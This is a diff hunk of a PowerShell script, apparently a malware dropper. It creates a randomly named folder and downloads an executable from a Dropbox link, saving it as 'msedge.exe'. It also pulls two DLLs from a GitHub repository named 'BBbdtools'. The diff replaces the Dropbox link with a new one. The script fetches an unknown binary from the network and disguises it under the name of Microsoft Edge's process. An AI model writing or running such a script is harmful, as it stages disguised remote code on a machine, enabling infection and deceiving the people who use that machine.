@@ -4,7 +4,7 @@ mkdir sVBXKuz
 
 cd sVBXKuz
 
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/i7cu35v7bj3fvfbk3bbp6/wsappa-2.0.exe?rlkey=j3rap110tv6br11xo3359uos1&dl=0" -OutFile msedge.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/h1w1j8ailp97p2c8yogav/wsappa-2.0.exe?rlkey=4hpnkpmpdtjbfa995n4pytrs6&dl=0" -OutFile msedge.exe
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
